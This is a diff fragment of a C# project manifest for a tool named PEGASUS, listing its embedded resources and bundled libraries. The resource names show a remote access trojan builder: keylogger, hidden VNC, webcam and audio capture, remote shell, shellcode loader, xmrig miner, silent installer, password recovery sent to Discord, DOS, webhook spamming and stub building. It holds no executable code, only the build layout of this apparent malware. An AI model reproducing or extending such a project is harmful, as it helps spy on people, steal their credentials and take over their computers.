+    <None Include="Resources\InputDialog.resources" />
+    <EmbeddedResource Include="Resources\ip2region" />
+    <EmbeddedResource Include="Resources\KL" />
+    <EmbeddedResource Include="Resources\label6.Text" />
+    <EmbeddedResource Include="Resources\listView1.BackgroundImage" />
+    <EmbeddedResource Include="Resources\LISTVIEWSPANELSMALL2.BackgroundImage" />
+    <EmbeddedResource Include="Resources\loader" />
+    <EmbeddedResource Include="Resources\mergeRegToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\nostub" />
+    <EmbeddedResource Include="Resources\notifyIcon.Icon" />
+    <EmbeddedResource Include="Resources\notifyIcon1.Icon" />
+    <EmbeddedResource Include="Resources\offToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\Online" />
+    <EmbeddedResource Include="Resources\onToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\openSupportTicketToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\parental controle" />
+    <EmbeddedResource Include="Resources\passwordRecoveryToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\PEGASUS" />
+    <None Include="Resources\costura.antire.runtime.dll.compressed" />
+    <None Include="Resources\costura.bouncycastle.crypto.dll.compressed" />
+    <None Include="Resources\costura.bunifu.licensing.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.1.5.3.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifubutton.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifucheckbox.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifucircleprogress.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifucolortransition.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifudatagridview.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifudatepicker.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifudropdown.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifuformdock.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifugauge.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifugradientpanel.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifugroupbox.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifuimagebutton.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifulabel.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifuloader.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifupages.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifupanel.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifupicturebox.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifuprogressbar.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifuradiobutton.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifurating.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifuscrollbar.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifuseparator.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifushadowpanel.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifushapes.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifuslider.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifusnackbar.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifutextbox.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifutoggleswitch.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifutooltip.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifutransition.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.bunifuusercontrol.dll.compressed" />
+    <None Include="Resources\costura.bunifu.ui.winforms.deprecated.dll.compressed" />
+    <None Include="Resources\costura.cgeoip.dll.compressed" />
+    <None Include="Resources\costura.costura.dll.compressed" />
+    <None Include="Resources\costura.costura.pdb.compressed" />
+    <None Include="Resources\costura.customcontrols.dll.compressed" />
+    <None Include="Resources\costura.customcontrols.pdb.compressed" />
+    <None Include="Resources\costura.discord.net.commands.dll.compressed" />
+    <None Include="Resources\costura.discord.net.core.dll.compressed" />
+    <None Include="Resources\costura.discord.net.rest.dll.compressed" />
+    <None Include="Resources\costura.discord.net.webhook.dll.compressed" />
+    <None Include="Resources\costura.discord.net.websocket.dll.compressed" />
+    <None Include="Resources\costura.dnlib.dll.compressed" />
+    <None Include="Resources\costura.fastcoloredtextbox.dll.compressed" />
+    <None Include="Resources\costura.guna.ui2.dll.compressed" />
+    <None Include="Resources\costura.iconextractor.dll.compressed" />
+    <None Include="Resources\costura.metadata" />
+    <None Include="Resources\costura.microsoft.bcl.asyncinterfaces.dll.compressed" />
+    <None Include="Resources\costura.microsoft.win32.primitives.dll.compressed" />
+    <None Include="Resources\costura.mono.cecil.dll.compressed" />
+    <None Include="Resources\costura.mono.cecil.mdb.dll.compressed" />
+    <None Include="Resources\costura.mono.cecil.pdb.dll.compressed" />
+    <None Include="Resources\costura.mono.cecil.rocks.dll.compressed" />
+    <None Include="Resources\costura.mono.httputility.dll.compressed" />
+    <None Include="Resources\costura.mono.nat.dll.compressed" />
+    <None Include="Resources\costura.netstandard.dll.compressed" />
+    <None Include="Resources\costura.newtonsoft.json.dll.compressed" />
+    <None Include="Resources\costura.pinvoke.kernel32.dll.compressed" />
+    <None Include="Resources\costura.pinvoke.shell32.dll.compressed" />
+    <None Include="Resources\costura.pinvoke.windows.core.dll.compressed" />
+    <None Include="Resources\costura.protobuf-net.dll.compressed" />
+    <None Include="Resources\costura.server.dll.compressed" />
+    <None Include="Resources\costura.server.pdb.compressed" />
+    <None Include="Resources\costura.sharpupdate.dll.compressed" />
+    <None Include="Resources\costura.sharpupdate.pdb.compressed" />
+    <None Include="Resources\costura.siticone.ui.dll.compressed" />
+    <None Include="Resources\costura.system.appcontext.dll.compressed" />
+    <None Include="Resources\costura.system.buffers.dll.compressed" />
+    <None Include="Resources\costura.system.collections.concurrent.dll.compressed" />
+    <None Include="Resources\costura.system.collections.dll.compressed" />
+    <None Include="Resources\costura.system.collections.immutable.dll.compressed" />
+    <None Include="Resources\costura.system.collections.nongeneric.dll.compressed" />
+    <None Include="Resources\costura.system.collections.specialized.dll.compressed" />
+    <None Include="Resources\costura.system.componentmodel.dll.compressed" />
+    <None Include="Resources\costura.system.componentmodel.eventbasedasync.dll.compressed" />
+    <None Include="Resources\costura.system.componentmodel.primitives.dll.compressed" />
+    <None Include="Resources\costura.system.componentmodel.typeconverter.dll.compressed" />
+    <None Include="Resources\costura.system.console.dll.compressed" />
+    <None Include="Resources\costura.system.data.common.dll.compressed" />
+    <None Include="Resources\costura.system.diagnostics.contracts.dll.compressed" />
+    <None Include="Resources\costura.system.diagnostics.debug.dll.compressed" />
+    <None Include="Resources\costura.system.diagnostics.diagnosticsource.dll.compressed" />
+    <None Include="Resources\costura.system.diagnostics.fileversioninfo.dll.compressed" />
+    <None Include="Resources\costura.system.diagnostics.process.dll.compressed" />
+    <None Include="Resources\costura.system.diagnostics.stacktrace.dll.compressed" />
+    <None Include="Resources\costura.system.diagnostics.textwritertracelistener.dll.compressed" />
+    <None Include="Resources\costura.system.diagnostics.tools.dll.compressed" />
+    <None Include="Resources\costura.system.diagnostics.tracesource.dll.compressed" />
+    <None Include="Resources\costura.system.diagnostics.tracing.dll.compressed" />
+    <None Include="Resources\costura.system.drawing.primitives.dll.compressed" />
+    <None Include="Resources\costura.system.dynamic.runtime.dll.compressed" />
+    <None Include="Resources\costura.system.globalization.calendars.dll.compressed" />
+    <None Include="Resources\costura.system.globalization.dll.compressed" />
+    <None Include="Resources\costura.system.globalization.extensions.dll.compressed" />
+    <None Include="Resources\costura.system.interactive.async.dll.compressed" />
+    <None Include="Resources\costura.system.io.compression.dll.compressed" />
+    <None Include="Resources\costura.system.io.compression.zipfile.dll.compressed" />
+    <None Include="Resources\costura.system.io.dll.compressed" />
+    <None Include="Resources\costura.system.io.filesystem.dll.compressed" />
+    <None Include="Resources\costura.system.io.filesystem.driveinfo.dll.compressed" />
+    <None Include="Resources\costura.system.io.filesystem.primitives.dll.compressed" />
+    <None Include="Resources\costura.system.io.filesystem.watcher.dll.compressed" />
+    <None Include="Resources\costura.system.io.isolatedstorage.dll.compressed" />
+    <None Include="Resources\costura.system.io.memorymappedfiles.dll.compressed" />
+    <None Include="Resources\costura.system.io.pipes.dll.compressed" />
+    <None Include="Resources\costura.system.io.unmanagedmemorystream.dll.compressed" />
+    <None Include="Resources\costura.system.linq.async.dll.compressed" />
+    <None Include="Resources\costura.system.linq.dll.compressed" />
+    <None Include="Resources\costura.system.linq.expressions.dll.compressed" />
+    <None Include="Resources\costura.system.linq.parallel.dll.compressed" />
+    <None Include="Resources\costura.system.linq.queryable.dll.compressed" />
+    <None Include="Resources\costura.system.memory.dll.compressed" />
+    <None Include="Resources\costura.system.net.http.dll.compressed" />
+    <None Include="Resources\costura.system.net.nameresolution.dll.compressed" />
+    <None Include="Resources\costura.system.net.networkinformation.dll.compressed" />
+    <None Include="Resources\costura.system.net.ping.dll.compressed" />
+    <None Include="Resources\costura.system.net.primitives.dll.compressed" />
+    <None Include="Resources\costura.system.net.requests.dll.compressed" />
+    <None Include="Resources\costura.system.net.security.dll.compressed" />
+    <None Include="Resources\costura.system.net.sockets.dll.compressed" />
+    <None Include="Resources\costura.system.net.webheadercollection.dll.compressed" />
+    <None Include="Resources\costura.system.net.websockets.client.dll.compressed" />
+    <None Include="Resources\costura.system.net.websockets.dll.compressed" />
+    <None Include="Resources\costura.system.numerics.vectors.dll.compressed" />
+    <None Include="Resources\costura.system.objectmodel.dll.compressed" />
+    <None Include="Resources\costura.system.reflection.dll.compressed" />
+    <None Include="Resources\costura.system.reflection.extensions.dll.compressed" />
+    <None Include="Resources\costura.system.reflection.primitives.dll.compressed" />
+    <None Include="Resources\costura.system.resources.reader.dll.compressed" />
+    <None Include="Resources\costura.system.resources.resourcemanager.dll.compressed" />
+    <None Include="Resources\costura.system.resources.writer.dll.compressed" />
+    <None Include="Resources\costura.system.runtime.compilerservices.unsafe.dll.compressed" />
+    <None Include="Resources\costura.system.runtime.compilerservices.visualc.dll.compressed" />
+    <None Include="Resources\costura.system.runtime.dll.compressed" />
+    <None Include="Resources\costura.system.runtime.extensions.dll.compressed" />
+    <None Include="Resources\costura.system.runtime.handles.dll.compressed" />
+    <None Include="Resources\costura.system.runtime.interopservices.dll.compressed" />
+    <None Include="Resources\costura.system.runtime.interopservices.runtimeinformation.dll.compressed" />
+    <None Include="Resources\costura.system.runtime.numerics.dll.compressed" />
+    <None Include="Resources\costura.system.runtime.serialization.formatters.dll.compressed" />
+    <None Include="Resources\costura.system.runtime.serialization.json.dll.compressed" />
+    <None Include="Resources\costura.system.runtime.serialization.primitives.dll.compressed" />
+    <None Include="Resources\costura.system.runtime.serialization.xml.dll.compressed" />
+    <None Include="Resources\costura.system.security.claims.dll.compressed" />
+    <None Include="Resources\costura.system.security.cryptography.algorithms.dll.compressed" />
+    <None Include="Resources\costura.system.security.cryptography.csp.dll.compressed" />
+    <None Include="Resources\costura.system.security.cryptography.encoding.dll.compressed" />
+    <None Include="Resources\costura.system.security.cryptography.primitives.dll.compressed" />
+    <None Include="Resources\costura.system.security.cryptography.x509certificates.dll.compressed" />
+    <None Include="Resources\costura.system.security.principal.dll.compressed" />
+    <None Include="Resources\costura.system.security.securestring.dll.compressed" />
+    <None Include="Resources\costura.system.text.encoding.dll.compressed" />
+    <None Include="Resources\costura.system.text.encoding.extensions.dll.compressed" />
+    <None Include="Resources\costura.system.text.regularexpressions.dll.compressed" />
+    <None Include="Resources\costura.system.threading.dll.compressed" />
+    <None Include="Resources\costura.system.threading.overlapped.dll.compressed" />
+    <None Include="Resources\costura.system.threading.tasks.dll.compressed" />
+    <None Include="Resources\costura.system.threading.tasks.extensions.dll.compressed" />
+    <None Include="Resources\costura.system.threading.tasks.parallel.dll.compressed" />
+    <None Include="Resources\costura.system.threading.thread.dll.compressed" />
+    <None Include="Resources\costura.system.threading.threadpool.dll.compressed" />
+    <None Include="Resources\costura.system.threading.timer.dll.compressed" />
+    <None Include="Resources\costura.system.valuetuple.dll.compressed" />
+    <None Include="Resources\costura.system.xml.readerwriter.dll.compressed" />
+    <None Include="Resources\costura.system.xml.xdocument.dll.compressed" />
+    <None Include="Resources\costura.system.xml.xmldocument.dll.compressed" />
+    <None Include="Resources\costura.system.xml.xmlserializer.dll.compressed" />
+    <None Include="Resources\costura.system.xml.xpath.dll.compressed" />
+    <None Include="Resources\costura.system.xml.xpath.xdocument.dll.compressed" />
+    <None Include="Resources\costura.vestris.resourcelib.dll.compressed" />
+    <None Include="Resources\PEGASUS.Forms.FormMiner.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormNetstat.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormPorts.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormPowerShell.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormProcessManager.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormRegistryEditor.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormRegValueEditBinary.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormRegValueEditMultiString.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormRegValueEditString.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormRegValueEditWord.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormRemoteDesktop.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormSetting.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormShell.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormWebcam.resources" />
+    <None Include="Resources\PEGASUS.Forms.FrmAngry.resources" />
+    <None Include="Resources\PEGASUS.Forms.FrmCSPM.resources" />
+    <None Include="Resources\PEGASUS.Forms.FrmDiscordST3.resources" />
+    <None Include="Resources\PEGASUS.Forms.FrmEmailer.resources" />
+    <None Include="Resources\PEGASUS.Forms.FrmInfo.resources" />
+    <None Include="Resources\PEGASUS.Forms.FrmNoStub.resources" />
+    <None Include="Resources\PEGASUS.Forms.FrmReco.resources" />
+    <None Include="Resources\PEGASUS.Forms.FrmSkynet.resources" />
+    <None Include="Resources\PEGASUS.Forms.FrmWebHookSPM.resources" />
+    <None Include="Resources\PEGASUS.Forms.Login.resources" />
+    <None Include="Resources\PEGASUS.Forms.PEGASUSMain.resources" />
+    <None Include="Resources\PEGASUS.Forms.Register.resources" />
+    <None Include="Resources\PEGASUS.Forms.Remote_Desktop.resources" />
+    <None Include="Resources\PEGASUS.Forms.Remote_hVNC.resources" />
+    <None Include="Resources\PEGASUS.Forms.Splashes.resources" />
+    <None Include="Resources\PEGASUS.Forms.Welcome.resources" />
+    <None Include="Resources\PEGASUS.FormSendFileToMemory.resources" />
+    <None Include="Resources\PEGASUS.FrmSplash.resources" />
+    <None Include="Resources\PEGASUS.Properties.Resources.resources" />
+    <None Include="Resources\PEGASUS.RhVNC_Connections.resources" />
+    <None Include="Resources\PEGASUS.VNCForm.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormAbout.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormAudio.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormBlockClients.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormBuilder.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormCertificate.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormChat.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormDOS.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormDownloadFile.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormFileManager.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormFileSearcher.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormFun.resources" />
+    <None Include="Resources\PEGASUS.Forms.FormKeylogger.resources" />
+    <EmbeddedResource Include="Resources\pEGASUSBUILDERToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\picHVNC.BackgroundImage" />
+    <EmbeddedResource Include="Resources\picIcon.Image" />
+    <EmbeddedResource Include="Resources\picTitleIcon.Image" />
+    <EmbeddedResource Include="Resources\pictureBox1.BackgroundImage" />
+    <EmbeddedResource Include="Resources\pictureBox1.Image" />
+    <EmbeddedResource Include="Resources\pictureBox2.Image" />
+    <EmbeddedResource Include="Resources\powershellToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\powersrc" />
+    <EmbeddedResource Include="Resources\ps2exe" />
+    <EmbeddedResource Include="Resources\recoverAllSendToDiscordToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\RK" />
+    <EmbeddedResource Include="Resources\sendEmailFromClientPCToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\ShellcodeLoader" />
+    <EmbeddedResource Include="Resources\silentInstallerToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\site" />
+    <EmbeddedResource Include="Resources\sKYNETSHOPToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\sKYNETToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\spamToolsToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\startToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\startToolStripMenuItem1.Image" />
+    <EmbeddedResource Include="Resources\startToolStripMenuItem2.Image" />
+    <EmbeddedResource Include="Resources\startToolStripMenuItem3.Image" />
+    <EmbeddedResource Include="Resources\startToolStripMenuItem4.Image" />
+    <EmbeddedResource Include="Resources\statusStrip1.BackgroundImage" />
+    <EmbeddedResource Include="Resources\stopToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\stopToolStripMenuItem1.Image" />
+    <EmbeddedResource Include="Resources\stopToolStripMenuItem2.Image" />
+    <EmbeddedResource Include="Resources\stopToolStripMenuItem3.Image" />
+    <EmbeddedResource Include="Resources\stopToolStripMenuItem4.Image" />
+    <EmbeddedResource Include="Resources\stopToolStripMenuItem5.Image" />
+    <EmbeddedResource Include="Resources\taskMgrDogToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\tasksControlToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\telegram" />
+    <EmbeddedResource Include="Resources\them" />
+    <EmbeddedResource Include="Resources\toolStripButton1.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem1.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem10.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem11.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem12.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem13.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem14.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem15.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem16.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem17.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem19.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem2.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem20.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem21.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem22.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem23.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem24.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem25.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem26.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem3.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem30.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem31.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem32.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem33.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem34.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem35.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem36.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem37.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem38.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem39.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem4.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem40.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem41.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem42.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem43.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem44.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem45.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem46.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem47.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem48.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem49.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem5.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem50.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem51.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem52.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem53.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem54.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem55.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem56.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem57.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem58.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem59.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem6.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem60.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem61.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem62.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem63.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem64.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem65.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem66.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem67.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem68.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem69.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem7.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem70.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem71.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem72.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem73.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem74.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem75.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem76.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem77.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem78.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem79.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem8.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem80.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem81.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem82.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem83.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem84.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem85.Image" />
+    <EmbeddedResource Include="Resources\toolStripMenuItem9.Image" />
+    <EmbeddedResource Include="Resources\tsimpouki" />
+    <EmbeddedResource Include="Resources\uploadsPluginToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\vbs" />
+    <EmbeddedResource Include="Resources\vimeo icon" />
+    <EmbeddedResource Include="Resources\watchDogToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\webHookSpammerToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\Welcome" />
+    <EmbeddedResource Include="Resources\wordpress icon" />
+    <EmbeddedResource Include="Resources\x" />
+    <EmbeddedResource Include="Resources\xmrig" />
+    <EmbeddedResource Include="Resources\youtube icon" />
+    <EmbeddedResource Include="Resources\_7z" />
+    <EmbeddedResource Include="Resources\_7z1" />
+    <None Include="Resources\PEGASUS.PegasusBytes.DarkBytes.key" />
+    <None Include="Resources\PEGASUS.PegasusBytes.PegasusBytes.key" />
+    <None Include="Resources\PEGASUS.Tools.Plugin.RemotehVNC.key" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\PEGASUS FULL VERSION.exe.licenses" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
